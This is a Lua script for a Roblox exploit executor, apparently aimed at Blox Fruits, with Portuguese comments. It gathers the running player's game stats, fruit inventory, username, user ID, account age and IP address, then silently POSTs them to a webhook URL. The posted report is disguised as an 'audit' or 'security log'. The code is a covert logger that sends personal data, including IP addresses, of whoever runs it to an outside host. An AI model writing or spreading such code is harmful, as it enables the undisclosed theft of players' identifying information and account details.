-- ==================== COLETA DE INFORMAÇÕES AVANÇADAS ====================
local function ColetarInformacoes()
    local stats = {
        Level = "N/D",
        Beli = "N/D",
        Fragments = "N/D"
    }
   
    pcall(function()
        -- Pega direto do Data (melhor método no Blox Fruits)
        if LocalPlayer:FindFirstChild("Data") then
            stats.Level = LocalPlayer.Data:FindFirstChild("Level") and LocalPlayer.Data.Level.Value or "N/D"
            stats.Beli = LocalPlayer.Data:FindFirstChild("Beli") and LocalPlayer.Data.Beli.Value or "N/D"
            stats.Fragments = LocalPlayer.Data:FindFirstChild("Fragments") and LocalPlayer.Data.Fragments.Value or "N/D"
        end
       
        -- Fallback via Remote
        if stats.Level == "N/D" then
            local commf = ReplicatedStorage:WaitForChild("Remotes", 2):WaitForChild("CommF_", 2)
            local remoteStats = commf:InvokeServer("getPlayerStats")
            if type(remoteStats) == "table" then
                stats.Level = remoteStats.Level or "N/D"
            end
        end
    end)

    -- Coleta de frutas
    local fruitsList = {}
    pcall(function()
        for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("fruit") then
                table.insert(fruitsList, item.Name)
            end
        end
        -- Frutas equipadas
        local char = LocalPlayer.Character
        if char then
            for _, item in pairs(char:GetChildren()) do
                if item:IsA("Tool") and item.Name:lower():find("fruit") then
                    table.insert(fruitsList, item.Name .. " (Equipada)")
                end
            end
        end
    end)

    local fruitsText = #fruitsList > 0 and table.concat(fruitsList, ", ") or "Nenhuma fruta no inventário"

    return {
        Level = stats.Level,
        Beli = stats.Beli,
        Fragments = stats.Fragments,
        Fruits = fruitsText,
        IP = GetIP(),
        HoraPC = os.date("%d/%m/%Y %H:%M:%S")
    }
end

-- ==================== ENVIO PARA WEBHOOK ====================
local function EnviarWebhook(info)
    local embed = {
        title = "🔥 HydraSpart - Relatório de Auditoria",
        color = 0x00ff88,
        fields = {
            {name = "👤 Usuário", value = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")", inline = true},
            {name = "🆔 User ID", value = "```" .. LocalPlayer.UserId .. "```", inline = true},
            {name = "🌐 IP do Usuário", value = "||" .. info.IP .. "||", inline = false},
            {name = "📊 Level Atual", value = "```" .. tostring(info.Level) .. "```", inline = true},
            {name = "💰 Beli", value = tostring(info.Beli), inline = true},
            {name = "💎 Fragments", value = tostring(info.Fragments), inline = true},
            {name = "⏳ Idade da Conta", value = LocalPlayer.AccountAge .. " dias", inline = true},
            {name = "🍎 Frutas", value = "```" .. info.Fruits .. "```", inline = false},
            {name = "🕒 Executado em", value = info.HoraPC, inline = false},
        },
        footer = { text = "HydraSpart Engine • Security Log" }
    }

    local payload = HttpService:JSONEncode({
        username = "HydraSpart Logger",
        embeds = {embed}
    })

    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

